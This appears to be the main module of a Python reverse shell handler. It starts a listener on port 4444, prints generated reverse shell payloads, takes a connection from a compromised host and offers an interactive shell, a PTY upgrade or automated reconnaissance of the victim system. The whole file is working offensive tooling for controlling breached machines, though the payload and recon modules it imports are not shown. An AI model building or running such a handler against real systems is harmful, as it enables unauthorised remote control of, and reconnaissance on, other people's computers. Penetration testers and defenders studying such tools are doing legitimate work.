"""Main reverse shell handler orchestration"""

from .shell.listener import Listener
from .shell.communicator import Communicator
from .shell.upgrader import ShellUpgrader
from .recon.system_info import SystemInfo
from .recon.situational_awareness import SituationalAwareness
from .interactive.shell_interface import ShellInterface
from .payloads.payload_generator import PayloadGenerator

class ReverseShellHandler:
    """Main reverse shell handler"""
    
    def __init__(self, lhost='0.0.0.0', lport=4444):
        self.lhost = lhost
        self.lport = lport
        self.listener = None
        self.communicator = None
    
    def run(self):
        """Main execution flow"""
        # Generate and print payloads
        payload_gen = PayloadGenerator(self.lhost, self.lport)
        payload_gen.print_payloads()
        
        # Start listener
        self.listener = Listener(self.lhost, self.lport)
        if not self.listener.start():
            return
        
        # Get connection
        client_socket, client_address = self.listener.get_connection()
        
        # Initialize components
        self.communicator = Communicator(client_socket)
        upgrader = ShellUpgrader(self.communicator)
        system_info = SystemInfo(self.communicator)
        situational_awareness = SituationalAwareness(self.communicator)
        
        # Check shell type
        system_info.check_shell_type()
        
        # Ask what to do
        self._show_menu(upgrader, situational_awareness)
        
        # Cleanup
        self.listener.close()
        print("\n[*] Session closed")
    
    def _show_menu(self, upgrader, situational_awareness):
        """Show menu and handle user choice"""
        print("\n[?] What would you like to do?")
        print("  1. Interactive shell")
        print("  2. Upgrade to PTY immediately")
        print("  3. Run situational awareness")
        
        choice = input("\nChoice (1-3): ")
        
        if choice == '2':
            upgrader.upgrade_to_pty()
            choice = '1'  # Then go interactive
        elif choice == '3':
            situational_awareness.run_full_recon()
            choice = '1'  # Then go interactive
        
        if choice == '1':
            shell_interface = ShellInterface(
                self.communicator,
                upgrader,
                situational_awareness
            )
            shell_interface.start()